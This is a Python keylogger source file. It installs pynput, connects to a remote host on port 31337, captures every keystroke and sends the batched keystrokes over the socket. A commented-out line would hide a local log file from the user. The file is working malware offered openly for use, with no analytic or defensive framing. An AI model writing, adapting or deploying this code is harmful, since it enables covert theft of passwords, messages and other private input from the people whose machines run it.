from subprocess import check_output
check_output("pip3 install pynput")
import socket
import pynput
from pynput.keyboard import Key, Listener


# keeping this in case I want to store locally and send keystrokes less frequently
# from subprocess import check_output
# hide log from user in file explorer
# check_output("attrib +s +h \"log.txt\"", shell=True)

# add your hostname
host = ''
ip = socket.gethostbyname(host)
port = 31337
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
# test statement to see if connection is made
# print(s.recv(1024).decode())

count = 0
keys = []
space = False


def on_press(key):
    global keys, count, space

    # check if backspace is pressed
    if key != Key.backspace:
        keys.append(key)
        count += 1
    else:
        # POTENTIAL PROBLEM: backspace held down could mess up counter and remove keys in the buffer
        # remove the unintended key
        keys.pop()
        count -= 2

    # log every 10 key presses
    if count >= 10 and key == Key.space:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    # append to or create log file this is the functional log
    temp = ""
    for key in keys:
        if key == Key.space:
            # newline if space
            temp += "\n"
        elif str(key).find("Key") != -1:
            # if other key press (alt, tab, etc.) add newlines around it
            temp += "\n" + str(key) + "\n"
        elif key == Key.shift:
            # catch for things we don't want to log
            pass
        else:
            # add normal characters
            key = str(key)
            temp += key[1]
    s.send(temp.encode())


def on_release(key):
    if key == pynput.keyboard.Key.esc:
        return False
    pass


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
